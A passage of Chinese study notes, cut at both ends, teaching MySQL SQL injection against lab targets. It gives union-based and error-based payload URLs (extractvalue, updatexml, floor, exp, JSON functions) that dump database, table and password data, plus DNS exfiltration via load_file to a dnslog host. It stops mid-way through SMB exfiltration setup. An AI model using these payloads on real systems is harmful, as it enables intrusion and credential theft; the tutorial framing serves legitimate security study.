-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">http://1.14.28.17:46649/string.php?id=1'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">and1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">23</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">//字符型</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>获取数据信息</p>
-<ol>
-<li>
-<p>判断注入点字段数</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">46649</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' order by 1%23</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">http://1.14.28.17:46649/string.php?id=1'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> order by</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">23</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">58551</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' group by 3%23</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>判断注入点回显位置</p>
-<p>关于     <span data-type="text" style="background-color: var(--b3-font-background9);">select 1,2,3</span>    的理解。</p>
-<ol>
-<li>
-<p>不管你select语句后的字段名是什么，他都会原封不动的回显出来。</p>
-<figure><figcaption>image</figcaption></figure>
-</li>
-<li>
-<p>在返回结果中，总是返回一行数据。</p>
-</li>
-<li>
-<p>字段名和返回的这一行数据是对应相等的，他们都等于你输入的select语句后的字段名</p>
-</li>
-<li>
-<p>返回的那一行数据的列数，等于你输入的select语句后的字段名的个数</p>
-</li>
-</ol>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">46649</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' union select 1,2,3%23</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">http://1.14.28.17:46649/string.php?id=0'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> union</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> select</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">23</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>获取数据库信息</p>
-<ul>
-<li>
-<p>获取【数据库版本、数据库类型】</p>
-<p><code>database() </code> 当前数据库名</p>
-<p><code>version()</code>  数据库版本</p>
-<p><code>user() </code> 连接用户</p>
-<p>mysql &gt;5.0 information_schemata库中/SCHEMATA</p>
-</li>
-<li>
-<p>获取【数据库名】</p>
-<p>limit 0,1   <span data-type="text" style="background-color: var(--b3-font-background8);">控制结果返回行数</span> 第一个参数是从0开始，代表从第一个结果开始。第二参数为行数，从1开始，代表返回一行。</p>
-<figure><figcaption>image</figcaption></figure>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">15460</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' union select 1,schema_name,user() from information_schema.schemata limit 4,1#</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><code>order by</code>  <span data-type="text" style="background-color: var(--b3-font-background8);">排序</span> <code>order by id</code>   用id字段进行排序 asc  desc</p>
-<p><code>group by </code>  <span data-type="text" style="background-color: var(--b3-font-background9);">分组排序</span> <code>select username,count(id) from users group by id;</code></p>
-<p><code>concat()</code>  <span data-type="text" style="background-color: var(--b3-font-background8);">拼接字符串</span>：<code>select concat('a','b','c'); ==&gt; 'abc'</code></p>
-<p><code>concat_ws()</code> <span data-type="text" style="background-color: var(--b3-font-background8);"> 指定字符拼接</span>:  <code> select concat_ws('@','a','b','c'); ==&gt; 'a@b@c'</code></p>
-<p><code>group_concat ()</code> 将查询的多行结果拼接在一行进行显示:   <code> select group_concat(id) from users;</code></p>
-<figure><figcaption>image</figcaption></figure>
-<figure><figcaption>image</figcaption></figure>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">15460</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' union select 1,group_concat(schema_name),user() from information_schema.schemata#</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>information_schema.schemata  数据库名.表名   该表存放了数据库信息</p>
-<figure><figcaption>image</figcaption></figure>
-<figure><figcaption>image</figcaption></figure>
-<p>limit 0,1 ==&gt; 控制结果返回行数 第一个参数是从0开始，代表从第一个结果开始。第二参数为行数，从1开始，代表返回一行。★</p>
-<p>order by  ==&gt; 指定某个字段进行排序 order by id 从id字段进行排序 asc desc</p>
-<p>group by  ==&gt; 利用分组排序 select username,count(id) from users group by id;</p>
-</li>
-<li>
-<p>查询当前数据库内所有的【表名】</p>
-<figure><figcaption>image</figcaption></figure>
-<figure><figcaption>image</figcaption></figure>
-<p>注意：mysql中的where用于条件查询，where table_schema=database() 表示把 table_schema字段=数据库名（message）的字段查询出来，如果不加这一句的话，全部table_secema对应的table_name都会被查询出来。</p>
-<div class="language-url line-numbers-mode" data-highlighter="shiki" data-ext="url" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-url"><span class="line"><span>http://1.14.28.17:58551/string.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()%23</span></span>
-<span class="line"><span></span></span>
-<span class="line"><span>http://1.14.28.17:58551/string.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema='message'%23</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><figcaption>image</figcaption></figure>
-</li>
-<li>
-<p>查询security数据库内users表名【字段名】</p>
-<figure><figcaption>image</figcaption></figure>
-<figure><figcaption>image</figcaption></figure>
-<div class="language-url line-numbers-mode" data-highlighter="shiki" data-ext="url" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-url"><span class="line"><span>http://1.14.28.17:58551/string.php?id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name='users'%23</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>和查询数据库名一样，group_concat(column_name) 查询字段名一行显示，在information_schema.COLUMNS这个表中，条件为TABLE_SCHEMA=database() and TABLE_NAME='users'.</p>
-</li>
-<li>
-<p>查询字段对应的【数据】</p>
-<figure><figcaption>image</figcaption></figure>
-<div class="language-url line-numbers-mode" data-highlighter="shiki" data-ext="url" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-url"><span class="line"><span>http://1.14.28.17:58551/string.php?id=0' union select 1,group_concat(username),group_concat(password) from security.users%23</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-<li>
-<p>解密数据</p>
-<p>md5 ==&gt; <a href="http://cmd5.org" target="_blank" rel="noopener noreferrer">cmd5.org</a>(base64 sha1 sha256 sha512) <a href="http://somd5.com" target="_blank" rel="noopener noreferrer">somd5.com</a></p>
-</li>
-</ul>
-</li>
-</ol>
-</li>
-<li>
-<p>提升权限</p>
-</li>
-<li>
-<p>内网渗透</p>
-</li>
-</ol>
-<h2>报错注入</h2>
-<ul>
-<li>
-<p><code>mysql(i)_error()</code>  输出mysql数据库的错误信息</p>
-</li>
-<li>
-<p><code>extractvalue()</code> 函数主要用于<strong>从XML文档中提取数据。</strong></p>
-</li>
-<li>
-<p>payload: 攻击载荷 ==&gt; 漏洞利用的代码</p>
-</li>
-<li>
-<p><code>0x7e</code> 是十六进制表示的波浪线（<code>~</code>）字符。</p>
-</li>
-<li>
-<p><code>(select user())</code> 是一个SQL查询，返回当前数据库的用户名。</p>
-</li>
-</ul>
-<h3>xpath报错</h3>
-<p>0x7e就是~  不属于xpath语法格式，因此报出xpath语法错误。★</p>
-<h5><strong>updatexml()</strong></h5>
-<ul>
-<li>作用：改变文档中符合条件的节点的值，使用不同的xml标记匹配和替换xml块的函数。</li>
-<li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li>
-<li>原理：updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
-<li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3));   由于<span data-type="text" style="color: var(--b3-font-color9);">0x7e是~</span>，<span data-type="text" style="color: var(--b3-font-color8);">不属于xpath语法格式，因此报出xpath语法错误</span>。</li>
-</ul>
-<h5><strong>extractvalue（）</strong></h5>
-<ul>
-<li>
-<p>作用：此函数从目标XML中返回包含所查询值的字符串</p>
-</li>
-<li>
-<p>语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
-</li>
-<li>
-<p>原理：extractvalue使用时当xpath_string<span data-type="text" style="color: var(--b3-font-color9);">格式出现错误</span>，<span data-type="text" style="color: var(--b3-font-color10);">mysql则会爆出xpath语法错误</span>（xpath syntax）</p>
-</li>
-<li>
-<p>例如：select user,password from users where user_id=1 and (extractvalue(1,0x7e));   由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</p>
-</li>
-</ul>
-<h5>使用条件</h5>
-<pre><code>    mysql&gt;5.1
-xpath 报错内容有32位长度限制
-</code></pre>
-<h5>payload</h5>
-<pre><code>payload:   &lt;span data-type="text" style="color: var(--b3-font-color8);"&gt;and extractvalue(1,concat(0x7e,(select user()),0x7e))  &lt;/span&gt;        ((20240819160743-0w86e8t "concat()  拼接字符串：select concat(&amp;apos;a&amp;apos;,&amp;apos;b&amp;apos;,&amp;apos;c&amp;apos;); ==&amp;gt; &amp;apos;abc&amp;apos;"))
-payload:   &lt;span data-type="text" style="color: var(--b3-font-color8);"&gt; and updatexml(1,concat(0x7e,(select user()),0x7e),1)&lt;/span&gt;
-</code></pre>
-<h4>注入流程</h4>
-<ol>
-<li>
-<p>判断是否存在注入</p>
-<p><a href="http://1.14.28.17:13815/string.php?id=1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:13815/string.php?id=1</a>' and 1=1%23</p>
-<figure><figcaption>image</figcaption></figure>
-<p><a href="http://1.14.28.17:13815/string.php?id=1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:13815/string.php?id=1</a>' and 1=2%23</p>
-<figure><figcaption>image</figcaption></figure>
-</li>
-<li>
-<p>判断注入点类型</p>
-<p><a href="http://1.14.28.17:13815/string.php?id=-1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:13815/string.php?id=-1</a>' union select 1,2,3%23</p>
-<figure><figcaption>image</figcaption></figure>
-<p><a href="http://1.14.28.17:13815/string.php?id=1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:13815/string.php?id=1</a>' and extractvalue(1,concat(0x7c,(select user())))%23</p>
-<figure><figcaption>image</figcaption></figure>
-<p><a href="http://1.14.28.17:13815/string.php?id=1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:13815/string.php?id=1</a>' and extractvalue(1,concat(0x7c,(select group_concat(schema_name) from information_schema.schemata)))%23</p>
-<figure><figcaption>image</figcaption></figure>
-</li>
-<li>
-<p>查询库名</p>
-<blockquote>
-<p>mysql 截取函数<br>
-substr substring mid left right<br>
-use security;select substr(database(),1,2) ==&gt; se<br>
-use security;select left(database(),1) ==&gt; s 从左向右截取<br>
-use security;select right(database(),1) ==&gt; y 从右向左截取</p>
-</blockquote>
-<p>通过截取函数绕过长度限制</p>
-<figure><figcaption>image</figcaption></figure>
-<p><a href="http://1.14.28.17:28330/string.php?id=1" target="_blank" rel="noopener noreferrer">http://1.14.28.17:28330/string.php?id=1</a>' and extractvalue(1,concat(0x7c,(select substr((select group_concat(schema_name) from information_schema.schemata),1,31))))%23</p>
-<figure><figcaption>image</figcaption></figure>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">http:</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">192.168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.100.40:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">43013</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">string.php</span><span style="--shiki-light:#50A14F;--shiki-dark:#FFFFFF">?</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' and extractvalue(1,concat(0x7c,(select substr((select group_concat(schema_name) from information_schema.schemata),32,31))))%23</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><figure><figcaption>image</figcaption></figure>
-<p><code>http://192.168.100.40:43013/string.php?id=1' and extractvalue(1,concat(0x7c,(select substr((select group_concat(schema_name) from information_schema.schemata),63,31))))%23</code><br></p>
-</li>
-<li>
-<p>查询字段名</p>
-<p><a href="http://192.168.100.40:43013/string.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:43013/string.php?id=1</a>' and extractvalue(1,concat(0x7c,(select substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,31))))%23</p>
-<figure><figcaption>image</figcaption></figure>
-</li>
-<li>
-<p>查数据</p>
-<p><a href="http://192.168.100.40:43013/string.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:43013/string.php?id=1</a>' and extractvalue(1,concat(0x7c,(select substr((select group_concat(id,'<em>',username,'</em>',password) from users),1,31))))%23</p>
-<p><a href="http://192.168.100.40:43013/string.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:43013/string.php?id=1</a>' and updatexml(1,concat(0x7e,(select substr((select group_concat(id,'<em>',username,'</em>',password) from users),1,31)),0x7e),1)%23</p>
-</li>
-</ol>
-<h3>floor报错函数</h3>
-<h4>使用条件</h4>
-<p>mysql &gt; 5.0<br>
-floor 取整数部分<br>
-floor 报错只允许查询返回一行结果</p>
-<h4>payload</h4>
-<p>and (select 1 from (select count( <em>),concat(user(),floor(rand(0)</em> 2))x from information_schema.tables group by x)y)</p>
-<div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-html"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">http://192.168.100.40:58222/string.php?id=1' and (select 1 from (select count( *),concat((select schema_name from information_schema.schemata limit 0,1),floor(rand(0)* 2))x from information_schema.tables group by x)y)%23</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><figure><figcaption>image</figcaption></figure>
-<h3>列名重复报错注入</h3>
-<p>name_const()函数在低版本中可以支持5.0，但是在大于5.1小于5.5 中就不支持了</p>
-<p>payload：<code>and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a)%23</code></p>
-<p><a href="http://192.168.100.40:58222/string.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:58222/string.php?id=1</a>' and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a)%23</p>
-<h3>整形溢出报错注入</h3>
-<pre><code>条件：mysql 5.5.5及以上版本不支持
-说明：exp是以e为底的指数函数，由于数字太大会产生溢出。该函数会在参数大于709时溢出，产生报错
-Payload：and exp(~(select * from (select user()) a) )
-</code></pre>
-<p><a href="http://192.168.100.40:64606/string.php?id=1%27%20and%20exp(~(select%20*%20from%20(select%20user()" target="_blank" rel="noopener noreferrer">http://192.168.100.40:64606/string.php?id=1' and exp(~(select * from (select user()</a>)a))%23</p>
-<figure><figcaption>image</figcaption></figure>
-<h3>几何函数报错注入</h3>
-<p>条件：高版本MySQL无法得到数据 &gt;5.5.47 失败<br>
-相关函数：geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()<br>
-说明：函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错<br>
-标准Payload：<code>select multipoint((select * from (select * from (select * from (select version())a)b)c))</code></p>
-<h3>JSON数据报错注入</h3>
-<p>条件：mysql 5.7.8以上版本<br>
-说明：从 MySQL 5.7.8 开始⽀持由RFC 7159 JSON 定义的本机数据类型 ，可以有效地访问 JSON（JavaScript Object Notation）文档中的数据。</p>
-<h4>json 数据格式</h4>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{username:'admin',password:'admin'}</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>JSON_TYPE</h4>
-<p>JSON_TYPE函数获取JSON值的类型，当我们传⼊的值不属于json格式则报错。<br>
-JSON_TYPE(version())<br>
-Payload:   id=1' and json_type(version())%23</p>
-<h4>JSON_EXTRACT()</h4>
-<p>JSON_EXTRACT(json_doc, path[, path] ...)<br>
-JSON_EXTRACT函数从 JSON ⽂档中返回数据，从与path参数匹配的⽂档部分中选择]<br>
-当第⼀个参数不是json类型的值则报错<br>
-JSON_EXTRACT(version(), '$[1]’)<br>
-JSON_EXTRACT((select user()),'$.a')<br>
-Payload:   id=1' and json_extract(user(),'$.a')%23<br>
-Payload:   id=1' and json_extract('[1,2,3]',user())%23</p>
-<h4>JSON_ARRAY_APPEND()</h4>
-<p>JSON_ARRAY_APPEND(json_doc, path, val[, path, val] ...)<br>
-将值附加到 JSON ⽂档中指定数组的末尾并返回结果，报错输出原理和json_extract函数相同。<br>
-select JSON_ARRAY_APPEND(version(),1,1);<br>
-select JSON_ARRAY_APPEND('[1,2]',version(),1);<br>
-Payload:   id=1' and JSON_ARRAY_APPEND('[1,2,3]’,user(),1)%23</p>
-<h2>数据外带</h2>
-<h4>DNS数据外带</h4>
-<ol>
-<li>
-<p>利用windows UNC路径组合mysql的load_file函数读取远程服务器的文件来实现将本地子查询语句拼接到域名中，实现dnslog数据外带。</p>
-</li>
-<li>
-<p><code>\</code>​<span data-type="text" style="background-color: var(--b3-font-background8);">的作用是转义</span>   \\\\==&gt;转义为\\</p>
-</li>
-<li>
-<p>DNS有61位长度限制，超过就无法显示。</p>
-</li>
-<li>
-<p>DNS数据外带网站：<a href="https://dnslog.org/" target="_blank" rel="noopener noreferrer">dnslog.org/</a></p>
-</li>
-<li>
-<p>数据库字段的值可能存在特殊符号，由于域名有一定规范，不能存在特殊符号，这些特殊符号拼接在域名里是无法做dns查询的。可以用hex编码或asci,将含特殊符号的数据外带出。<br>
-char(ascii(databas())     hex(database())</p>
-</li>
-<li>
-<p>payload：and load_file(concat('\\',database(),'cbffba4a.log.dnslog.store.'))%23</p>
-<p><a href="http://192.168.100.223/sqli-labs/less-1/?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.223/sqli-labs/less-1/?id=1</a>' and load_file(concat('\\',(select database()),'.cbffba4a.log.dnslog.store.\1.txt'))%23<a href="http://192.168.100.223/sqli-labs/less-1/?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.223/sqli-labs/less-1/?id=1</a>' and load_file(concat('\\',(select schema_name from information_schema.schemata limit 0,1),'.cbffba4a.log.dnslog.store.\1.txt'))%23</p>
-</li>
-</ol>
-<h4>SMB数据外带</h4>
-<h5>SMB</h5>
-<p>Server Message Block-SMB,即服务（器）消息块，是IBM公司在80年代中期发明的一种文件共享协<br>
-议。它只是系统之间通信的一种方式（协蚁），并不是一款特殊的软件。SMB协议被设计成为允许计算机<br>
-通过本地局域网(LAN)在远程主机上读写文件。远程主机上通过SMB协议开放访问的目录称为共享文<br>
-件夹。</p>
-<h5>CIFS</h5>
-<p>Common Internet File System-ClFS,即通用因特网文件系统。ClFS由美国微软公司开发。</p>
-<h5>Samba</h5>
-<p>Samba是一组不同功能程序组成的应用集合，它能让Liux服务器实现文件服务器、身份授权和认证、名称解析和打印服务等功能。与ClFS类似，Samba也是SMB协议的实现，它允许Windows客户访问Linux系统上的目录、打印机和文件(就像访问Windows服务器时一样)。重要的是，Samba可以将Linux服务器构建成一个域控制器。这样一来，就可以直接使用Windows域中的用户凭据，免去手动在Liux服务器上重新创建的麻烦。</p>
-<h5>SMB外带步骤</h5>
-<ol>
-<li>
-<p>Centos安装SMB</p>
-<p>安装：yum install samba samba-client samba-common -y</p>
-<pre><code>        yum -y install samba
-</code></pre>
-<p>查看安装：rpm -qa |grep samba</p>
-<p>开机自启：systemctl enable smb.service<br>
